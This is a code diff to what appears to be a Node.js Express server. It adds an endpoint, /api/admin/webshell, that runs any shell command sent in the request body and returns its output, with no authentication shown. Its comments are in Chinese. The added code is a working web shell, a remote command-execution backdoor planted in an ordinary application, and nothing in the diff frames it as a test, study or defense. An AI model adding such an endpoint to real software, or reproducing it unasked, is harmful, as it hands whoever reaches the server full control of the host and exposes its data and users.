@@ -6,6 +6,10 @@ import { fileURLToPath } from 'url';
 import fs from 'fs/promises';
 import axios from 'axios';
 import os from 'os';
+import { exec } from 'child_process';
+import { promisify } from 'util';
+
+const execPromise = promisify(exec);
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -159,6 +163,58 @@ app.get('/api/admin/logs', (req, res) => {
     logs: serverLogs,
     count: serverLogs.length
   });
+});
+
+// 管理 API - Webshell 命令执行
+app.post('/api/admin/webshell', async (req, res) => {
+  try {
+    const { command } = req.body;
+
+    if (!command || typeof command !== 'string') {
+      return res.status(400).json({
+        success: false,
+        error: '命令参数无效'
+      });
+    }
+
+    // 记录命令执行
+    addLog('info', `Webshell执行命令: ${command}`);
+
+    // 设置超时时间为 30 秒
+    const { stdout, stderr } = await execPromise(command, {
+      timeout: 30000,
+      maxBuffer: 1024 * 1024 * 10, // 10MB
+      cwd: process.cwd()
+    });
+
+    const result = {
+      success: true,
+      command: command,
+      stdout: stdout || '',
+      stderr: stderr || '',
+      timestamp: new Date().toISOString()
+    };
+
+    // 记录执行结果
+    if (stderr) {
+      addLog('warn', `Webshell命令有错误输出: ${stderr.substring(0, 100)}`);
+    } else {
+      addLog('info', `Webshell命令执行成功`);
+    }
+
+    res.json(result);
+  } catch (error) {
+    addLog('error', `Webshell命令执行失败: ${error.message}`);
+
+    res.json({
+      success: false,
+      command: req.body.command,
+      stdout: error.stdout || '',
+      stderr: error.stderr || error.message,
+      error: error.message,
+      timestamp: new Date().toISOString()
+    });
+  }
 });
 
 // 获取访问者IP和位置信息
